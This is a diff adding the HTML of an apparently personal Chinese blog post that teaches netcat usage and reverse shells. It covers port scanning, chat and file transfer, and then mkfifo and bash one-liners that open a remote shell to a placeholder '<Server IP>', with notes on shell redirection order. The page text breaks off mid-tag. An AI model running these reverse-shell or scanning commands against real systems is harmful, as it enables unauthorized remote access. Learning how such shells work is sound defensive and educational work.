@@ -1,0 +1,878 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言现在每天都在跟shell打交道，但是一直没有机会好好的了解一下，因此今天总结一下。 0x01 linux nc命令与反弹shelllinux中nc命令是一个功能强大的网络工具，全称是netcat。nc/netcat(选项)(参数)选项1234567891011121314-g&amp;lt;网关&amp;gt;：设置路由器跃程通信网关，最多设置8个；-G&amp;lt;指向器数目&amp;gt;：设置来源路由指向器，其数值为">
+<meta property="og:type" content="article">
+<meta property="og:title" content="总结一下反弹shell">
+<meta property="og:url" content="http://yoursite.com/2019/11/13/总结一下反弹shell/index.html">
+<meta property="og:site_name" content="L&#39;s Blog">
+<meta property="og:description" content="前言现在每天都在跟shell打交道，但是一直没有机会好好的了解一下，因此今天总结一下。 0x01 linux nc命令与反弹shelllinux中nc命令是一个功能强大的网络工具，全称是netcat。nc/netcat(选项)(参数)选项1234567891011121314-g&amp;lt;网关&amp;gt;：设置路由器跃程通信网关，最多设置8个；-G&amp;lt;指向器数目&amp;gt;：设置来源路由指向器，其数值为">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/shell_1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/shell_2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/shell_3.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/shell_4.png">
+<meta property="og:updated_time" content="2019-11-13T09:34:37.699Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="总结一下反弹shell">
+<meta name="twitter:description" content="前言现在每天都在跟shell打交道，但是一直没有机会好好的了解一下，因此今天总结一下。 0x01 linux nc命令与反弹shelllinux中nc命令是一个功能强大的网络工具，全称是netcat。nc/netcat(选项)(参数)选项1234567891011121314-g&amp;lt;网关&amp;gt;：设置路由器跃程通信网关，最多设置8个；-G&amp;lt;指向器数目&amp;gt;：设置来源路由指向器，其数值为">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/shell_1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/11/13/总结一下反弹shell/">
+
+
+
+
+
+  <title>总结一下反弹shell | L's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">L's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">share with you</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/13/总结一下反弹shell/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ljdd520">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="L's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">总结一下反弹shell</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-13T17:31:51+08:00">
+                2019-11-13
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/shell/" itemprop="url" rel="index">
+                    <span itemprop="name">shell</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2.9k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  12
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>现在每天都在跟shell打交道，但是一直没有机会好好的了解一下，因此今天总结一下。</p>
+<h5 id="0x01-linux-nc命令与反弹shell"><a href="#0x01-linux-nc命令与反弹shell" class="headerlink" title="0x01 linux nc命令与反弹shell"></a>0x01 linux nc命令与反弹shell</h5><h6 id="linux中nc命令是一个功能强大的网络工具，全称是netcat。"><a href="#linux中nc命令是一个功能强大的网络工具，全称是netcat。" class="headerlink" title="linux中nc命令是一个功能强大的网络工具，全称是netcat。"></a>linux中nc命令是一个功能强大的网络工具，全称是netcat。</h6><h6 id="nc-netcat-选项-参数"><a href="#nc-netcat-选项-参数" class="headerlink" title="nc/netcat(选项)(参数)"></a>nc/netcat(选项)(参数)</h6><h6 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">-g&lt;网关&gt;：设置路由器跃程通信网关，最多设置8个；</span><br><span class="line">-G&lt;指向器数目&gt;：设置来源路由指向器，其数值为4的倍数；</span><br><span class="line">-h：在线帮助；</span><br><span class="line">-i&lt;延迟秒数&gt;：设置时间间隔，以便传送信息及扫描通信端口；</span><br><span class="line">-l：使用监听模式，监控传入的资料；</span><br><span class="line">-n：直接使用ip地址，而不通过域名服务器；</span><br><span class="line">-o&lt;输出文件&gt;：指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存；</span><br><span class="line">-p&lt;通信端口&gt;：设置本地主机使用的通信端口；</span><br><span class="line">-r：指定源端口和目的端口都进行随机的选择；</span><br><span class="line">-s&lt;来源位址&gt;：设置本地主机送出数据包的IP地址；</span><br><span class="line">-u：使用UDP传输协议；</span><br><span class="line">-v：显示指令执行过程；</span><br><span class="line">-w&lt;超时秒数&gt;：设置等待连线的时间；</span><br><span class="line">-z：使用0输入/输出模式，只在扫描通信端口时使用。</span><br></pre></td></tr></table></figure>
+
+<h6 id="参数："><a href="#参数：" class="headerlink" title="参数："></a>参数：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">主机：指定主机的IP地址或主机名称；</span><br><span class="line">端口号：可以是单个整数或者是一个范围。</span><br></pre></td></tr></table></figure>
+
+<h5 id="TCP端口扫描"><a href="#TCP端口扫描" class="headerlink" title="TCP端口扫描"></a>TCP端口扫描</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># nc -v -z -w2 192.168.0.3 1-100</span><br><span class="line">-v：显示指令执行过程；</span><br><span class="line">-z：使用0输入/输出模式，只在扫描通信端口时使用。</span><br><span class="line">-w2：设置等待连线的时间为2s；</span><br></pre></td></tr></table></figure>
+
+<h5 id="UDP端口扫描"><a href="#UDP端口扫描" class="headerlink" title="UDP端口扫描"></a>UDP端口扫描</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">## UDP端口扫描</span><br><span class="line">	# nc -u -z -w2 192.168.0.1 1-1000 //扫描192.168.0.3 的端口 范围是 1-1000</span><br><span class="line"></span><br><span class="line">## 扫描指定端口</span><br><span class="line"></span><br><span class="line">	# nc -nvv 192.168.0.1 80 //扫描 80端口</span><br><span class="line">	(UNKNOWN) [192.168.0.1] 80 (?) open</span><br></pre></td></tr></table></figure>
+
+<h5 id="使用netcat实现局域网聊天"><a href="#使用netcat实现局域网聊天" class="headerlink" title="使用netcat实现局域网聊天"></a>使用netcat实现局域网聊天</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">一端先启好监听：</span><br><span class="line"></span><br><span class="line">	nc -l 9999</span><br><span class="line"></span><br><span class="line">另一端端进行连接：</span><br><span class="line"></span><br><span class="line">	nc 192.168.220.128 9999</span><br><span class="line"></span><br><span class="line">连接之后的任一边的输入在另一边都可看到</span><br></pre></td></tr></table></figure>
+
+<h5 id="使用netcat实现文件传输"><a href="#使用netcat实现文件传输" class="headerlink" title="使用netcat实现文件传输"></a>使用netcat实现文件传输</h5><h6 id="和局域网聊天的原理是一样的，不过是把输入输出重定向到文件接收入端先启好监听："><a href="#和局域网聊天的原理是一样的，不过是把输入输出重定向到文件接收入端先启好监听：" class="headerlink" title="和局域网聊天的原理是一样的，不过是把输入输出重定向到文件接收入端先启好监听："></a>和局域网聊天的原理是一样的，不过是把输入输出重定向到文件接收入端先启好监听：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 8080 &gt; recv.txt</span><br></pre></td></tr></table></figure>
+
+<h6 id="发送端进行发送："><a href="#发送端进行发送：" class="headerlink" title="发送端进行发送："></a>发送端进行发送：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc xxx.xxx.xxx.xxx 8080 &lt; send.txt</span><br></pre></td></tr></table></figure>
+
+<h6 id="不过传输完之后不会自动断开连接得手动ctrl-c断开，而且转输完成并没有什么标志不知是否已传完。"><a href="#不过传输完之后不会自动断开连接得手动ctrl-c断开，而且转输完成并没有什么标志不知是否已传完。" class="headerlink" title="不过传输完之后不会自动断开连接得手动ctrl+c断开，而且转输完成并没有什么标志不知是否已传完。"></a>不过传输完之后不会自动断开连接得手动ctrl+c断开，而且转输完成并没有什么标志不知是否已传完。</h6><h5 id="0x01-什么是反弹shell？"><a href="#0x01-什么是反弹shell？" class="headerlink" title="0x01 什么是反弹shell？"></a>0x01 什么是反弹shell？</h5><h6 id="下面我们先来理解一下反弹shell。一般情况下从本地控制远程的一台机器可以通过远程登陆-比如ssh-telnet-从本地向远程的机器主动建立连接进行控制，就是说本地是client，远程被控机是server。反弹shell-也叫reverse-shell-就是把方向反过来，从远程被控主机向本地建立连接，及远程被控机是client，本地是server。"><a href="#下面我们先来理解一下反弹shell。一般情况下从本地控制远程的一台机器可以通过远程登陆-比如ssh-telnet-从本地向远程的机器主动建立连接进行控制，就是说本地是client，远程被控机是server。反弹shell-也叫reverse-shell-就是把方向反过来，从远程被控主机向本地建立连接，及远程被控机是client，本地是server。" class="headerlink" title="下面我们先来理解一下反弹shell。一般情况下从本地控制远程的一台机器可以通过远程登陆(比如ssh/telnet)从本地向远程的机器主动建立连接进行控制，就是说本地是client，远程被控机是server。反弹shell(也叫reverse shell)就是把方向反过来，从远程被控主机向本地建立连接，及远程被控机是client，本地是server。"></a>下面我们先来理解一下反弹shell。一般情况下从本地控制远程的一台机器可以通过远程登陆(比如ssh/telnet)从本地向远程的机器主动建立连接进行控制，就是说本地是client，远程被控机是server。反弹shell(也叫reverse shell)就是把方向反过来，从远程被控主机向本地建立连接，及远程被控机是client，本地是server。</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/shell_1.png" alt></p>
+<h5 id="建立反弹shell"><a href="#建立反弹shell" class="headerlink" title="建立反弹shell"></a>建立反弹shell</h5><h5 id="建立本地server"><a href="#建立本地server" class="headerlink" title="建立本地server"></a>建立本地server</h5><h6 id="使用nc在本地建立server进行网络连接监听，本例子监听在8080端口上。"><a href="#使用nc在本地建立server进行网络连接监听，本例子监听在8080端口上。" class="headerlink" title="使用nc在本地建立server进行网络连接监听，本例子监听在8080端口上。"></a>使用<code>nc</code>在本地建立server进行网络连接监听，本例子监听在8080端口上。</h6><h6 id="nc-lvp-8080"><a href="#nc-lvp-8080" class="headerlink" title="$ nc -lvp 8080"></a><code>$ nc -lvp 8080</code></h6><h5 id="建立远程client"><a href="#建立远程client" class="headerlink" title="建立远程client"></a>建立远程client</h5><h6 id="方法一：在远程被控机上用nc建立client进行连接。"><a href="#方法一：在远程被控机上用nc建立client进行连接。" class="headerlink" title="方法一：在远程被控机上用nc建立client进行连接。"></a>方法一：在远程被控机上用nc建立client进行连接。</h6><h6 id="1-mkfifo-pipe创建有名管道，有名管道可以通过文件的方式开放管道的两端，一端可以写另一端读取写入的内容。"><a href="#1-mkfifo-pipe创建有名管道，有名管道可以通过文件的方式开放管道的两端，一端可以写另一端读取写入的内容。" class="headerlink" title="1. mkfifo pipe创建有名管道，有名管道可以通过文件的方式开放管道的两端，一端可以写另一端读取写入的内容。"></a>1. <code>mkfifo pipe</code>创建有名管道，有名管道可以通过文件的方式开放管道的两端，一端可以写另一端读取写入的内容。</h6><h6 id="2-cat-pipe读取有名管道中的内容，读取的内容通过管道-写入bash。"><a href="#2-cat-pipe读取有名管道中的内容，读取的内容通过管道-写入bash。" class="headerlink" title="2. cat pipe读取有名管道中的内容，读取的内容通过管道|写入bash。"></a>2. <code>cat pipe</code>读取有名管道中的内容，读取的内容通过管道<code>|</code>写入<code>bash</code>。</h6><h6 id="3-bash-i-2-gt-amp-1建立交互式shell，并把标准错误合并到标准输出，然后通过管道-发给nc客户端。"><a href="#3-bash-i-2-gt-amp-1建立交互式shell，并把标准错误合并到标准输出，然后通过管道-发给nc客户端。" class="headerlink" title="3. bash -i 2&gt;&amp;1建立交互式shell，并把标准错误合并到标准输出，然后通过管道|发给nc客户端。"></a>3. <code>bash -i 2&gt;&amp;1</code>建立交互式shell，并把标准错误合并到标准输出，然后通过管道<code>|</code>发给<code>nc</code>客户端。</h6><h6 id="4-nc-8080-gt-pipe向server发起连接，并把从server端接收到的内容写入pipe，注意，这些写到pipe的内容又被上面步骤的2读出来写给shell。"><a href="#4-nc-8080-gt-pipe向server发起连接，并把从server端接收到的内容写入pipe，注意，这些写到pipe的内容又被上面步骤的2读出来写给shell。" class="headerlink" title="4. nc 8080 &gt;pipe向server发起连接，并把从server端接收到的内容写入pipe，注意，这些写到pipe的内容又被上面步骤的2读出来写给shell。"></a>4. <code>nc 8080 &gt;pipe</code>向server发起连接，并把从server端接收到的内容写入<code>pipe</code>，注意，这些写到<code>pipe</code>的内容又被上面步骤的<code>2</code>读出来写给shell。</h6><h6 id="感觉有点绕，我们在来回顾一下。"><a href="#感觉有点绕，我们在来回顾一下。" class="headerlink" title="感觉有点绕，我们在来回顾一下。"></a>感觉有点绕，我们在来回顾一下。</h6><h6 id="前面的那一串命令建立了一个连接，该连接通过nc与server端进行连接，server端的输入会被发送到client端的nc并写入pipe，之后被cat读出来发给shell执行。shell的执行输出通过nc发给server。连接的图示如下："><a href="#前面的那一串命令建立了一个连接，该连接通过nc与server端进行连接，server端的输入会被发送到client端的nc并写入pipe，之后被cat读出来发给shell执行。shell的执行输出通过nc发给server。连接的图示如下：" class="headerlink" title="前面的那一串命令建立了一个连接，该连接通过nc与server端进行连接，server端的输入会被发送到client端的nc并写入pipe，之后被cat读出来发给shell执行。shell的执行输出通过nc发给server。连接的图示如下："></a>前面的那一串命令建立了一个连接，该连接通过<code>nc</code>与server端进行连接，server端的输入会被发送到client端的<code>nc</code>并写入<code>pipe</code>，之后被<code>cat</code>读出来发给shell执行。shell的执行输出通过<code>nc</code>发给server。连接的图示如下：</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/shell_2.png" alt></p>
+<h6 id="方法2：在远程机上用建立连接。"><a href="#方法2：在远程机上用建立连接。" class="headerlink" title="方法2：在远程机上用建立连接。"></a>方法2：在远程机上用建立连接。</h6><h6 id="前面的方法1中不太简洁的地方是用了cat，那么我们可以简化一下："><a href="#前面的方法1中不太简洁的地方是用了cat，那么我们可以简化一下：" class="headerlink" title="前面的方法1中不太简洁的地方是用了cat，那么我们可以简化一下："></a>前面的方法1中不太简洁的地方是用了<code>cat</code>，那么我们可以简化一下：</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/shell_3.png" alt></p>
+<h6 id="建立方法的命令如下："><a href="#建立方法的命令如下：" class="headerlink" title="建立方法的命令如下："></a>建立方法的命令如下：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkfifo /tmp/f</span><br><span class="line">bash -i 2&gt;&amp;1 &lt; /tmp/f | nc &lt;Server IP&gt; 8888 &gt; /tmp/f</span><br></pre></td></tr></table></figure>
+
+<h6 id="方法3："><a href="#方法3：" class="headerlink" title="方法3："></a>方法3：</h6><h6 id="了解了上面的方法后不禁想问Client端的数据流反转是否可行？当然可以！还是看图说话。"><a href="#了解了上面的方法后不禁想问Client端的数据流反转是否可行？当然可以！还是看图说话。" class="headerlink" title="了解了上面的方法后不禁想问Client端的数据流反转是否可行？当然可以！还是看图说话。"></a>了解了上面的方法后不禁想问Client端的数据流反转是否可行？当然可以！还是看图说话。</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/shell_4.png" alt></p>
+<h6 id="建立连接方法如下："><a href="#建立连接方法如下：" class="headerlink" title="建立连接方法如下："></a>建立连接方法如下：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkfifo pipe</span><br><span class="line">nc &lt;Server IP&gt; 8888 &lt; pipe | bash -i  &gt; pipe 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<h5 id="其他话题"><a href="#其他话题" class="headerlink" title="其他话题"></a>其他话题</h5><h6 id="1-啥是FIFO？"><a href="#1-啥是FIFO？" class="headerlink" title="1. 啥是FIFO？"></a>1. 啥是FIFO？</h6><h6 id="“FIFO”是Linux操作系统上面一种特殊的进程间通讯的手段，类似管道“PIPE”，相同之处："><a href="#“FIFO”是Linux操作系统上面一种特殊的进程间通讯的手段，类似管道“PIPE”，相同之处：" class="headerlink" title="“FIFO”是Linux操作系统上面一种特殊的进程间通讯的手段，类似管道“PIPE”，相同之处："></a>“FIFO”是Linux操作系统上面一种特殊的进程间通讯的手段，类似管道“PIPE”，相同之处：</h6><h6 id="都是进程间通讯的手段，可用于传递消息"><a href="#都是进程间通讯的手段，可用于传递消息" class="headerlink" title="都是进程间通讯的手段，可用于传递消息"></a>都是进程间通讯的手段，可用于传递消息</h6><h6 id="都是“半双工单向”数据流模式"><a href="#都是“半双工单向”数据流模式" class="headerlink" title="都是“半双工单向”数据流模式"></a>都是“半双工单向”数据流模式</h6><h6 id="但不同之处在于："><a href="#但不同之处在于：" class="headerlink" title="但不同之处在于："></a>但不同之处在于：</h6><h6 id="“PIPE”创建的管道存在于父-子进程之间，通常是fork-出来的父子进程间使用。"><a href="#“PIPE”创建的管道存在于父-子进程之间，通常是fork-出来的父子进程间使用。" class="headerlink" title="“PIPE”创建的管道存在于父/子进程之间，通常是fork()出来的父子进程间使用。"></a>“PIPE”创建的管道存在于父/子进程之间，通常是fork()出来的父子进程间使用。</h6><h6 id="“FIFO”有名管道顾名思义是有名字的，名字就是文件系统中创建出来的问题件，这样就可以支持不同的进程之间使用这个管道进行通信了。"><a href="#“FIFO”有名管道顾名思义是有名字的，名字就是文件系统中创建出来的问题件，这样就可以支持不同的进程之间使用这个管道进行通信了。" class="headerlink" title="“FIFO”有名管道顾名思义是有名字的，名字就是文件系统中创建出来的问题件，这样就可以支持不同的进程之间使用这个管道进行通信了。"></a>“FIFO”有名管道顾名思义是有名字的，名字就是文件系统中创建出来的问题件，这样就可以支持不同的进程之间使用这个管道进行通信了。</h6><h6 id="想知道的更详细些可以阅读经典的《UNIX环境高级编程》。"><a href="#想知道的更详细些可以阅读经典的《UNIX环境高级编程》。" class="headerlink" title="想知道的更详细些可以阅读经典的《UNIX环境高级编程》。"></a>想知道的更详细些可以阅读经典的《UNIX环境高级编程》。</h6><h6 id="2-思考一下下面的两个命令有什么不同？"><a href="#2-思考一下下面的两个命令有什么不同？" class="headerlink" title="2. 思考一下下面的两个命令有什么不同？"></a>2. 思考一下下面的两个命令有什么不同？</h6><h6 id="nc-lt-Server-IP-gt-8888-lt-tmp-f-bash-i-2-gt-amp-1-gt-tmp-f"><a href="#nc-lt-Server-IP-gt-8888-lt-tmp-f-bash-i-2-gt-amp-1-gt-tmp-f" class="headerlink" title="nc &lt;Server IP&gt; 8888 &lt; /tmp/f | bash -i 2&gt;&amp;1 &gt; /tmp/f"></a><code>nc &lt;Server IP&gt; 8888 &lt; /tmp/f | bash -i 2&gt;&amp;1 &gt; /tmp/f</code></h6><h6 id="nc-lt-Server-IP-gt-8888-lt-tmp-f-bash-i-gt-tmp-f-2-gt-amp-1"><a href="#nc-lt-Server-IP-gt-8888-lt-tmp-f-bash-i-gt-tmp-f-2-gt-amp-1" class="headerlink" title="nc &lt;Server IP&gt; 8888 &lt; /tmp/f | bash -i  &gt; /tmp/f 2&gt;&amp;1"></a><code>nc &lt;Server IP&gt; 8888 &lt; /tmp/f | bash -i  &gt; /tmp/f 2&gt;&amp;1</code></h6><h6 id="不同之处是2-gt-amp-1-gt-tmp-f和-gt-tmp-f-2-gt-amp-1。"><a href="#不同之处是2-gt-amp-1-gt-tmp-f和-gt-tmp-f-2-gt-amp-1。" class="headerlink" title="不同之处是2&gt;&amp;1 &gt; /tmp/f和&gt; /tmp/f 2&gt;&amp;1。"></a>不同之处是<code>2&gt;&amp;1 &gt; /tmp/f</code>和<code>&gt; /tmp/f 2&gt;&amp;1</code>。</h6><h6 id="gt-tmp-f-2-gt-amp-1可以正确将标准输出与标准错误合并后导入-tmp-f，而2-gt-amp-1-gt-tmp-f最终只把标准输出导入了-tmp-f，标准错误还是没有，那么是为什么呢？"><a href="#gt-tmp-f-2-gt-amp-1可以正确将标准输出与标准错误合并后导入-tmp-f，而2-gt-amp-1-gt-tmp-f最终只把标准输出导入了-tmp-f，标准错误还是没有，那么是为什么呢？" class="headerlink" title="&gt; /tmp/f 2&gt;&amp;1可以正确将标准输出与标准错误合并后导入/tmp/f，而2&gt;&amp;1 &gt; /tmp/f最终只把标准输出导入了/tmp/f，标准错误还是没有，那么是为什么呢？"></a><code>&gt; /tmp/f 2&gt;&amp;1</code>可以正确将标准输出与标准错误合并后导入<code>/tmp/f</code>，而<code>2&gt;&amp;1 &gt; /tmp/f</code>最终只把标准输出导入了<code>/tmp/f</code>，标准错误还是没有，那么是为什么呢？</h6><h6 id="先分析一下正常-gt-tmp-f-2-gt-amp-1的执行过程。"><a href="#先分析一下正常-gt-tmp-f-2-gt-amp-1的执行过程。" class="headerlink" title="先分析一下正常&gt; /tmp/f 2&gt;&amp;1的执行过程。"></a>先分析一下正常<code>&gt; /tmp/f 2&gt;&amp;1</code>的执行过程。</h6><h6 id="先解析-gt-tmp-f的时候进程会把标准输出1定向到FIFO文件-tmp-f"><a href="#先解析-gt-tmp-f的时候进程会把标准输出1定向到FIFO文件-tmp-f" class="headerlink" title="先解析&gt; /tmp/f的时候进程会把标准输出1定向到FIFO文件/tmp/f"></a>先解析<code>&gt; /tmp/f</code>的时候进程会把标准输出<code>1</code>定向到FIFO文件<code>/tmp/f</code></h6><h6 id="再解析2-gt-amp-1的时候，进程的标准错误2定向到了标准输出1对应的目标，由于此时1指向了-tmp-f，那么自然标准错误2也被定向到了这个FIFO文件。"><a href="#再解析2-gt-amp-1的时候，进程的标准错误2定向到了标准输出1对应的目标，由于此时1指向了-tmp-f，那么自然标准错误2也被定向到了这个FIFO文件。" class="headerlink" title="再解析2&gt;&amp;1的时候，进程的标准错误2定向到了标准输出1对应的目标，由于此时1指向了/tmp/f，那么自然标准错误2也被定向到了这个FIFO文件。"></a>再解析<code>2&gt;&amp;1</code>的时候，进程的标准错误<code>2</code>定向到了标准输出<code>1</code>对应的目标，由于此时<code>1</code>指向了<code>/tmp/f</code>，那么自然标准错误<code>2</code>也被定向到了这个FIFO文件。</h6><h6 id="再分析一下异常2-gt-amp-1-gt-tmp-f的执行过程。"><a href="#再分析一下异常2-gt-amp-1-gt-tmp-f的执行过程。" class="headerlink" title="再分析一下异常2&gt;&amp;1 &gt; /tmp/f的执行过程。"></a>再分析一下异常<code>2&gt;&amp;1 &gt; /tmp/f</code>的执行过程。</h6><h6 id="首先2-gt-amp-1在执行的时候是把进程的标准错误2定向到了标准输出1对应的目标，这个目标此时是进程执行的终端。"><a href="#首先2-gt-amp-1在执行的时候是把进程的标准错误2定向到了标准输出1对应的目标，这个目标此时是进程执行的终端。" class="headerlink" 